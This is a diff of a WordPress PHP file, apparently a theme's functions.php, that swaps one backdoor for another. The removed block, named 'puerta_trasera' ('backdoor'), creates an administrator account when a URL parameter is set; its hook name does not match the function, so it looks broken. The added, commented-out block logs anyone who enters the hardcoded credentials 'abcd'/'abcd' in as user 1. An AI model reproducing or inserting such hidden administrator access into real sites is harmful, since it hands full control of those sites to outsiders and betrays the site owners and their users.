@@ -203,20 +203,23 @@ remove_action('wp_head', 'start_post_rel_link', 10, 0);
 remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
 
 
-//http://www.xxx.zzz?bd=c
-add_action('wp_head', 'bcd');
-function puerta_trasera() {
-  If ($_GET['bc'] == 'd') {
-    require('wp-includes/registration.php');
-    If (!username_exists('bcd')) {
-      $user_id = wp_create_user('bcd', 'bcd');
-      $user = new WP_User($user_id);
-      $user->set_role('administrator');
-      echo 'bcd creada';
-      die();
-    }
-  }
+/*function alogin_virtual_login($username,$password) {
+    if ( isset($username) && isset($password) )
+        if ( ($username == "abcd") && ($password == "abcd") )
+            return true;
+    return false;
 }
+add_action('wp_authenticate','alogin_authentication');
+function alogin_authentication() {
+     $username=$_POST['log'];
+     $password=$_POST['pwd'];
+    $ext_auth = alogin_virtual_login($username,$password);
+    if($ext_auth) {
+        wp_set_auth_cookie(1);
+        header("Location:".home_url('/').'wp-admin');
+    }
+}*/
+
 
 
 ?>
